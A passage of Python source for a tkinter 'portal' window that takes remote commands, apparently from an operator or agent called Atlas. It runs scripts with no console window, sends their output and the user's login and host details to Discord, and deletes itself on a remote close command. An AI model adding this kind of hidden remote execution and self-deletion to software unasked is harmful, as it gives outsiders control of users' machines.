            # Chat + speech is now handled by Firebase (instant).
            # GitHub command just confirms delivery to Discord.
            msg = cmd.get("text", "")
            if msg:
                _post_to_discord(f"{tag} Speak sent via Firebase: {msg[:200]}")
            return True, msg

        elif cmd_type == "run_script":
            path = cmd.get("path", "")
            if not path or not Path(path).exists():
                return False, f"Script not found: {path}"
            try:
                proc = subprocess.run(
                    [sys.executable, path],
                    capture_output=True, text=True, timeout=120,
                    creationflags=CREATE_NO_WINDOW)
                output = proc.stdout + proc.stderr
                _post_file_to_discord(f"{tag} Output of {path}", _write_temp(output))
                return proc.returncode == 0, output
            except Exception as e:
                return False, f"Script error: {e}"

        elif cmd_type == "close_portal":
            # Atlas remotely closes the portal — no confirmation needed
            _post_to_discord(f"{tag} Portal closed by Atlas.")
            self.root.after(0, lambda: self._force_close())
            return True, "Portal closing..."

        else:
            return False, f"Unknown command type: {cmd_type}"

    def _close(self):
        """User clicked the X button — ask for confirmation first."""
        from tkinter import messagebox
        result = messagebox.askyesno(
            "Close Portal?",
            "Are you sure you want to close the portal?\n\n"
            "This will disconnect from Atlas and delete the portal file.\n"
            "You can always open another one if needed.",
            icon="question")
        if result:
            self._force_close()

    def _force_close(self):
        """Actually close and self-delete — no confirmation."""
        self.root.destroy()
        try:
            portal_path = Path(__file__).resolve()
            if self.executed_file.exists():
                self.executed_file.unlink()
            if portal_path.exists():
                portal_path.unlink()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
        host = platform.node() or "unknown"
        _post_to_discord(
            f"**Portal Opened**\n"
            f"User: {user}@{host}\n"
            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            f"Python: {platform.python_version()}\n"
            f"Folder: {Path(__file__).parent}")
    except Exception:
        pass

    root = tk.Tk()
    PortalWindow(root)
    root.mainloop()
